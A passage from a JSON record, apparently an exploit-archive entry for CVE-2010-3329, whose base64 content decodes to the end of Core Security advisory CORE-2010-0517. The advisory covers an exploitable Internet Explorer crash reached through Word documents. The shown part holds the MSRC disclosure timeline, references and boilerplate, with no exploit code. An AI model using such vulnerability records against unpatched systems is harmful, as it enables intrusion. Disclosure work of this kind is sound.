YmxpY2F0aW9uIGNhbiBiZSByZXZpZXdlZCBpZiBNaWNyb3NvZnQNCnJlc3BvbmRzIHdpdGggYSBmaXJtIGNvbW1pdG1lbnQgdG8gYSByZWxlYXNlIGRhdGUgb2YgZml4ZXMsIGFuZA0KdGVjaG5pY2FsIGluZm9ybWF0aW9uIGFib3V0IHRoZSByb290IGNhdXNlIG9mIHRoaXMgdnVsbmVyYWJpbGl0eS4NCg0KLiAyMDEwLTA4LTA0Og0KTVNSQyByZXNwb25kcyB0aGF0IHRoZSB1cGRhdGVkIGFkdmlzb3J5IGRyYWZ0IHdhcyBpbnRlcm5hbGx5IGZvcndhcmRlZA0KYW5kIHRoZXkgYXJlIHdvcmtpbmcgb24gY29sbGVjdGluZyBhbnN3ZXJzIHRvIHRoZSByZXF1ZXN0ZWQgcXVlc3Rpb25zLg0KDQouIDIwMTAtMDgtMDU6DQpNU1JDIHNlbmRzIHRoZSBhbnN3ZXJzIHRvIHRoZSBhc2tlZCBxdWVzdGlvbnM6DQogICAxLiBUaGUgYWZmZWN0ZWQgdmVyc2lvbnMgb2YgSW50ZXJuZXQgRXhwbG9yZXIgYXJlIElFNiBbNF0sIElFNyBhbmQgSUU4Lg0KICAgMi4gTVNSQyBpcyB1bmFibGUgdG8gYXNzaWduIGEgQ1ZFIGFzIGl0IGlzIHRvbyBlYXJseS4gQ1ZFcyBhcmUNCnR5cGljYWxseSBhc3NpZ25lZCBjbG9zZXIgdG8gdGhlIHNjaGVkdWxlZCByZWxlYXNlIGRhdGUgYW5kIE1TUkMgd2lsbA0KcmVjZWl2ZSB0aGUgYmxvY2sgb2YgQ1ZFcyBmcm9tIE1pdHJlIGZvciB0aGUgT2N0b2JlciByZWxlYXNlIG9mIHRoZQ0KSW50ZXJuZXQgRXhwbG9yZXIgc2VjdXJpdHkgdXBkYXRlLg0KICAgMy4gTVNSQyBub3RpZmllcyB0aGVyZSBpcyBubyBhdHRhY2sgdmVjdG9yIGluIElFLCBhbmQgdGhleSBjYW5ub3QNCnByb3ZpZGUgc3RlcHMgdG8gcmVwcm9kdWNlIHRoZSB2dWxuZXJhYmlsaXR5IGluIElFLg0KICAgNC4gVGhlIGtub3dsZWRnZSBiYXNlIGFydGljbGUgYWJvdXQgdGhlIG5ld2x5IGludHJvZHVjZWQgT2ZmaWNlDQpraWxsYml0IHdhcyByZWRpcmVjdGVkIHRvIFtodHRwOi8vc3VwcG9ydC5taWNyb3NvZnQuY29tL2tiLzIyNTI2NjRdLg0KDQouIDIwMTAtMDgtMDY6DQpDb3JlIGFza3MgTVNSQyB0byBjbGFyaWZ5IGlmIHRoZSBmaXggZm9yIHRoaXMgaXNzdWUgaGFzIGJlZW4gc2NoZWR1bGVkDQp0byBiZSByZWxlYXNlZCBpbiBPY3RvYmVyLg0KDQouIDIwMTAtMDgtMDY6DQpNU1JDIGNvbmZpcm1zIHRoYXQgdGhlIGZpeCBmb3IgdGhpcyBpc3N1ZSBpcyBzY2hlZHVsZWQgZm9yIHRoZSBPY3RvYmVyDQpyZWxlYXNlIG9mIElFLg0KDQouIDIwMTAtMDgtMDk6DQpDb3JlIHJlLXNjaGVkdWxlcyB0aGUgcHVibGljYXRpb24gb2YgdGhlIGFkdmlzb3J5IGZvciBPY3RvYmVyIDEyIGFuZA0Kbm90aWZpZXMgdGhhdCB0aGlzIGRhdGUgc2hvdWxkIGJlIGNvbnNpZGVyZWQgYXMgZmluYWwsIGlmIE1pY3Jvc29mdCBkb2VzDQpub3QgcmVsZWFzZSBmaXhlcyBvbiB0aGF0IGRhdGUsIHRoZSBhZHZpc29yeSB3aWxsIGJlIHJlbGVhc2VkIGFzICd1c2VyDQpyZWxlYXNlJy4NCg0KLiAyMDEwLTA4LTA5Og0KTVNSQyBjb25maXJtcyB0aGF0IHRoZSBmaXggZm9yIHRoaXMgaXNzdWUgaXMgc2NoZWR1bGVkIGZvciB0aGUgT2N0b2Jlcg0KcmVsZWFzZSBvZiBJRS4NCg0KLiAyMDEwLTEwLTAxOg0KTVNSQyBwcm92aWRlcyBhIHN0YXR1cyB1cGRhdGUgYWJvdXQgdGhpcyBpc3N1ZSBhbmQgbm90aWZpZXMgdGhhdCBpdCBpcw0Kc2xhdGVkIHRvIGJlIGluY2x1ZGVkIGluIHRoZSBPY3RvYmVyIHJlbGVhc2Ugb2YgdGhlIElFIEN1bXVsYXRpdmUgVXBkYXRlDQphbmQgU2FmZUhUTUwgdXBkYXRlIHNjaGVkdWxlZCBmb3IgT2N0b2JlciAxMiwgMjAxMC4gTVNSQyBhbHNvIG5vdGlmaWVzDQp0aGF0IHRoZSBDVkUgYXNzaWduZWQgdG8gdGhpcyBpc3N1ZSBpcyBDVkUtMjAxMC0zMzI5Lg0KDQouIDIwMTAtMTAtMDE6DQpNU1JDIG5vdGlmaWVzIHRoYXQgdGhleSBoYXZlIG1hZGUgYSBtaXN0YWtlIGFuZCBpbmNsdWRlZCBhbiBpbnZhbGlkDQpkZXRhaWwgaW4gdGhlIGxhc3Qgc3RhdHVzIHVwZGF0ZS4gSW4gcGFydGljdWxhciwgdGhlIGlzc3VlIGRvZXMgbm90DQphZmZlY3QgdGhlIFNhZmVIVE1MIHVwZGF0ZSBzY2hlZHVsZWQgZm9yIE9jdG9iZXIgYnV0IGl0IHdpbGwgYmUgc2hpcHBpbmcNCmluIHRoZSBJRSBDdW11bGF0aXZlIFVwZGF0ZSBzY2hlZHVsZWQgZm9yIE9jdG9iZXIuDQoNCi4gMjAxMC0xMC0wMToNCkNvcmUgYWNrbm93bGVkZ2VzIHRoZSBNU1JDJ3MgZS1tYWlsIGFuZCBub3RpZmllcyB0aGF0IGFsdGhvdWdoIHRoZQ0KcHJvYmxlbSBpcyBsb2NhdGVkIGluIElFLW93bmVkIGNvZGUsIHRoZSBwcm9ibGVtIGFsc28gYWZmZWN0cyBPZmZpY2UgdXANCnRvIDIwMTAuIENvcmUgYXNzdW1lcyB0aGlzIHdpbGwgYmUgc3BlY2lmaWVkIGluIHRoZSBNU1JDIGJ1bGxldGluIGFuZA0KYXNrcyBmb3IgY29uZmlybWF0aW9uLg0KDQouIDIwMTAtMTAtMDQ6DQpNU1JDIGNvbmZpcm1zIHRoYXQgdGhlIGRlc2NyaXB0aW9uIG9mIHRoZSB2dWxuZXJhYmlsaXR5IGNhbGxzIG91dCB0aGF0DQp0aGUgdmVjdG9yIHRvIHRoZSB2dWxuZXJhYmlsaXR5IGlzIHRocm91Z2ggb3BlbmluZyBhIHdvcmQgZG9jdW1lbnQuDQoNCi4gMjAxMC0xMC0xMjoNCkFkdmlzb3J5IENPUkUtMjAxMC0wNTE3IGlzIHB1Ymxpc2hlZC4NCg0KDQo5LiAqUmVmZXJlbmNlcyoNCg0KWzFdIE1pY3Jvc29mdCBzZWN1cml0eSBidWxsZXRpbiBzdW1tYXJ5IGZvciBPY3RvYmVyIDIwMTAgLQ0KW2h0dHA6Ly93d3cubWljcm9zb2Z0LmNvbS90ZWNobmV0L3NlY3VyaXR5L2J1bGxldGluL21zMTAtb2N0Lm1zcHhdLg0KWzJdIE9mZmljZSBraWxsYml0IFtodHRwOi8vc3VwcG9ydC5taWNyb3NvZnQuY29tL2tiLzk4MzYzMl0uDQpbM10gVGhpcyBidWcgd2FzIG9yaWdpbmFsbHkgaW52ZXN0aWdhdGVkIGluIE1pY3Jvc29mdCBPZmZpY2UgYnkgQ29yZSwNCmJ1dCBNU1JDIGRldGVybWluZWQgWzIwMTAtMDctMDJdIHRoYXQgdGhpcyBidWcgaXMgYW4gZXhwbG9pdGFibGUgY3Jhc2gNCmluIEludGVybmV0IEV4cGxvcmVyLg0KWzRdIE1TUkMgd2FzIG5vdCBhYmxlIHRvIHJlcHJvZHVjZSB0aGlzIGlzc3VlIG9uIElFNiwgaG93ZXZlciB0aGV5DQpub3RpZmllcyB0aGUgY29kZSBoYXMgYmVlbiBkZXRlcm1pbmVkIHRvIGV4aXN0IGluIHRoaXMgdmVyc2lvbiBhbmQgdGhlDQpmaXggd2lsbCBiZSBzY29wZWQgdG8gYWRkcmVzcyB0aGlzIHBsYXRmb3JtIGFzIHdlbGwuDQoNCg0KMTAuICpBYm91dCBDb3JlTGFicyoNCg0KQ29yZUxhYnMsIHRoZSByZXNlYXJjaCBjZW50ZXIgb2YgQ29yZSBTZWN1cml0eSBUZWNobm9sb2dpZXMsIGlzIGNoYXJnZWQNCndpdGggYW50aWNpcGF0aW5nIHRoZSBmdXR1cmUgbmVlZHMgYW5kIHJlcXVpcmVtZW50cyBmb3IgaW5mb3JtYXRpb24NCnNlY3VyaXR5IHRlY2hub2xvZ2llcy4gV2UgY29uZHVjdCBvdXIgcmVzZWFyY2ggaW4gc2V2ZXJhbCBpbXBvcnRhbnQNCmFyZWFzIG9mIGNvbXB1dGVyIHNlY3VyaXR5IGluY2x1ZGluZyBzeXN0ZW0gdnVsbmVyYWJpbGl0aWVzLCBjeWJlcg0KYXR0YWNrIHBsYW5uaW5nIGFuZCBzaW11bGF0aW9uLCBzb3VyY2UgY29kZSBhdWRpdGluZywgYW5kIGNyeXB0b2dyYXBoeS4NCk91ciByZXN1bHRzIGluY2x1ZGUgcHJvYmxlbSBmb3JtYWxpemF0aW9uLCBpZGVudGlmaWNhdGlvbiBvZg0KdnVsbmVyYWJpbGl0aWVzLCBub3ZlbCBzb2x1dGlvbnMgYW5kIHByb3RvdHlwZXMgZm9yIG5ldyB0ZWNobm9sb2dpZXMuDQpDb3JlTGFicyByZWd1bGFybHkgcHVibGlzaGVzIHNlY3VyaXR5IGFkdmlzb3JpZXMsIHRlY2huaWNhbCBwYXBlcnMsDQpwcm9qZWN0IGluZm9ybWF0aW9uIGFuZCBzaGFyZWQgc29mdHdhcmUgdG9vbHMgZm9yIHB1YmxpYyB1c2UgYXQ6DQpbaHR0cDovL2NvcmVsYWJzLmNvcmVzZWN1cml0eS5jb20vXS4NCg0KDQoxMS4gKkFib3V0IENvcmUgU2VjdXJpdHkgVGVjaG5vbG9naWVzKg0KDQpDb3JlIFNlY3VyaXR5IFRlY2hub2xvZ2llcyBkZXZlbG9wcyBzdHJhdGVnaWMgc29sdXRpb25zIHRoYXQgaGVscA0Kc2VjdXJpdHktY29uc2Npb3VzIG9yZ2FuaXphdGlvbnMgd29ybGR3aWRlIGRldmVsb3AgYW5kIG1haW50YWluIGENCnByb2FjdGl2ZSBwcm9jZXNzIGZvciBzZWN1cmluZyB0aGVpciBuZXR3b3Jrcy4gVGhlIGNvbXBhbnkncyBmbGFnc2hpcA0KcHJvZHVjdCwgQ09SRSBJTVBBQ1QsIGlzIHRoZSBtb3N0IGNvbXByZWhlbnNpdmUgcHJvZHVjdCBmb3IgcGVyZm9ybWluZw0KZW50ZXJwcmlzZSBzZWN1cml0eSBhc3N1cmFuY2UgdGVzdGluZy4gQ09SRSBJTVBBQ1QgZXZhbHVhdGVzIG5ldHdvcmssDQplbmRwb2ludCBhbmQgZW5kLXVzZXIgdnVsbmVyYWJpbGl0aWVzIGFuZCBpZGVudGlmaWVzIHdoYXQgcmVzb3VyY2VzIGFyZQ0KZXhwb3NlZC4gSXQgZW5hYmxlcyBvcmdhbml6YXRpb25zIHRvIGRldGVybWluZSBpZiBjdXJyZW50IHNlY3VyaXR5DQppbnZlc3RtZW50cyBhcmUgZGV0ZWN0aW5nIGFuZCBwcmV2ZW50aW5nIGF0dGFja3MuIENvcmUgU2VjdXJpdHkNClRlY2hub2xvZ2llcyBhdWdtZW50cyBpdHMgbGVhZGluZyB0ZWNobm9sb2d5IHNvbHV0aW9uIHdpdGggd29ybGQtY2xhc3MNCnNlY3VyaXR5IGNvbnN1bHRpbmcgc2VydmljZXMsIGluY2x1ZGluZyBwZW5ldHJhdGlvbiB0ZXN0aW5nIGFuZCBzb2Z0d2FyZQ0Kc2VjdXJpdHkgYXVkaXRpbmcuIEJhc2VkIGluIEJvc3RvbiwgTUEgYW5kIEJ1ZW5vcyBBaXJlcywgQXJnZW50aW5hLCBDb3JlDQpTZWN1cml0eSBUZWNobm9sb2dpZXMgY2FuIGJlIHJlYWNoZWQgYXQgNjE3LTM5OS02OTgwIG9yIG9uIHRoZSBXZWIgYXQNCltodHRwOi8vd3d3LmNvcmVzZWN1cml0eS5jb21dLg0KDQoNCjEyLiAqRGlzY2xhaW1lcioNCg0KVGhlIGNvbnRlbnRzIG9mIHRoaXMgYWR2aXNvcnkgYXJlIGNvcHlyaWdodCAoYykgMjAxMCBDb3JlIFNlY3VyaXR5DQpUZWNobm9sb2dpZXMgYW5kIChjKSAyMDEwIENvcmVMYWJzLCBhbmQgYXJlIGxpY2Vuc2VkIHVuZGVyIGEgQ3JlYXRpdmUNCkNvbW1vbnMgQXR0cmlidXRpb24gTm9uLUNvbW1lcmNpYWwgU2hhcmUtQWxpa2UgMy4wIChVbml0ZWQgU3RhdGVzKQ0KTGljZW5zZTogW2h0dHA6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzMuMC91cy9dDQoNCg0KMTMuICpQR1AvR1BHIEtleXMqDQoNClRoaXMgYWR2aXNvcnkgaGFzIGJlZW4gc2lnbmVkIHdpdGggdGhlIEdQRyBrZXkgb2YgQ29yZSBTZWN1cml0eQ0KVGVjaG5vbG9naWVzIGFkdmlzb3JpZXMgdGVhbSwgd2hpY2ggaXMgYXZhaWxhYmxlIGZvciBkb3dubG9hZCBhdA0KW2h0dHA6Ly93d3cuY29yZXNlY3VyaXR5LmNvbS9maWxlcy9hdHRhY2htZW50cy9jb3JlX3NlY3VyaXR5X2Fkdmlzb3JpZXMuYXNjXS4=", 
    "filename": "platforms/windows/dos/15262.txt", 
    "id": "15262", 
    "cves": [
        "CVE-2010-3329"
    ]
}